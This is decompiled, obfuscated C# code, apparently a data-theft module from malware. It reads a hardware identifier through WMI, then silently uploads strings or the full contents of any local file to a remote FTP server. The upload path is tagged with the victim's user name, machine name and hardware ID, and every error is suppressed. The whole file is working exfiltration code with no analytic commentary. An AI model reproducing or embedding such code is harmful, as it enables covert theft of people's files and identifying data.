using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace azCTgkmpGT;

internal sealed class aDJKTHVvtfISh
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string qRWwyoluwsX()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107349072));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107349019)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107349034);
			ManagementObject val3 = new ManagementObject(getString_0(107348997) + text2 + getString_0(107348956));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107348983)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107401381) : text;
		}
	}

	public static void hknyQTQpXdeCtPb(string foHkYUZciXBS = "URL", string zJOPlLFtjkg = "USERNAME", string PWRzfCFURsvgnGq = "ACCESO", string rgeTPSaNwPn = "")
	{
		try
		{
			string text = qRWwyoluwsX();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(foHkYUZciXBS + getString_0(107349773) + Environment.UserName + getString_0(107349728) + Environment.MachineName + getString_0(107349739) + text + getString_0(107349702));
			ftpWebRequest.Method = getString_0(107348926);
			ftpWebRequest.Credentials = new NetworkCredential(zJOPlLFtjkg, PWRzfCFURsvgnGq);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(rgeTPSaNwPn);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void AUzNYWrxJKEB(string mFjiKqNlsSwJyGWM = "URL", string UgJgJVoGJTvTubm = "USERNAME", string RZkWKfOfwpUB = "ACCESO", string gtJXlEQzVGhFXK = "")
	{
		try
		{
			string text = qRWwyoluwsX();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(mFjiKqNlsSwJyGWM + getString_0(107349773) + Environment.UserName + getString_0(107349728) + Environment.MachineName + getString_0(107349739) + text + getString_0(107349739) + Path.GetFileName(gtJXlEQzVGhFXK));
			ftpWebRequest.Method = getString_0(107348926);
			ftpWebRequest.Credentials = new NetworkCredential(UgJgJVoGJTvTubm, RZkWKfOfwpUB);
			byte[] array = File.ReadAllBytes(gtJXlEQzVGhFXK);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static aDJKTHVvtfISh()
	{
		Strings.CreateGetStringDelegate(typeof(aDJKTHVvtfISh));
	}
}
